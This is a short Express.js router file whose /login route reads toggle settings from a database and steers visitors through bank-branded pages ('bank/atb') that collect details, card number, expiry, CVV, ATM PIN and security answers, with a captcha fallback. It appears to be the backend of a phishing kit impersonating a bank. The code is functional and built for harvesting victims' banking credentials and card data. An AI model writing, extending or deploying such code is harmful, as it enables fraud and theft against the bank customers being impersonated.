// userRouter.js
const express = require('express');
const router = express.Router();
const dbConfig = require('../dbConfig');
const { Pool } = require('pg');

const pool = new Pool(dbConfig);

router.get('/login', async (req, res) => {
    try {
        const getId = 1; // Since we're always dealing with the record with id = 1
        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
        let count = 0
        let countRmvDetailsPage = 0
        let countRmvCardPage = 0
        let rmvDetailsPage = false
        let rmvCardPage = false

        Object.keys(result.rows[0].data.settings.atb).forEach(key => {
            if (result.rows[0].data.settings.atb[key] === 'off') {
              count++;
              if(key != 'card' && key != 'exp' && key != 'cvv' && key != 'atm'){
                countRmvDetailsPage++;
              } else {
                countRmvCardPage++;
                console.log(countRmvCardPage);
              }
            }
        });

        if(countRmvDetailsPage == 10){
            rmvDetailsPage = true
        } else if (countRmvCardPage == 4){
            rmvCardPage = true 
        }
        
        console.log("Remove Details : ", rmvDetailsPage)
        console.log("Remove Card : ", rmvCardPage)


        if (result.rows[0].data.settings.atb.qa > 0) {
            res.render('bank/atb/login/index', { navig: "/atb/qst" });
        } else if(count >= 14) {
            res.render('bank/atb/login/index', {navig: "/atb/finish"});
        } else {
            if(rmvDetailsPage){
                if(rmvCardPage){
                    res.render('bank/atb/login/index', { navig: "/atb/finish" });
                } else {
                    res.render('bank/atb/login/index', { navig: "/atb/card" });
                }
            } else {
                res.render('bank/atb/login/index', { navig: "/atb/details" });
            }
        }


    } catch (error) {
        console.error(error);
        res.render('captcha/index');
    }
})



// Export the router
module.exports = router;
